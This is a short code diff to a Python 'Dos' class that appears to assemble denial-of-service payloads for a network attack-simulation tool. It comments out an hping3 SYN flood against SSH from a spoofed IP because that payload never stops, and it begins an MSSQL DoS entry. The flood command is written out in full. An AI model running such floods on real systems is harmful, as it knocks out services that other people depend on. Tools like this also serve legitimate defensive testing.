@@ -13,11 +13,13 @@ class Dos():
     def getPayloads(self):
 
         ### hping SYN flood against SSH with spoofed IP
-        self.payloads.append([
-            "hping SYN flood against SSH with spoofed IP",
-            "command",
-            [self._sudo, self._hping3, self._target, '-I', 'wlan0', '-a', '192.168.100.10', '-S', '-p', '22', '--flood']
-            ])
+        # /!\ Issue: this payload is looping and never stopping...
+
+#        self.payloads.append([
+#            "hping SYN flood against SSH with spoofed IP",
+#            "command",
+#            [self._sudo, self._hping3, self._target, '-I', 'wlan0', '-a', '192.168.100.10', '-S', '-p', '22', '--flood']
+#            ])
 
         ### DoS against MSSQL
         self.payloads.append([
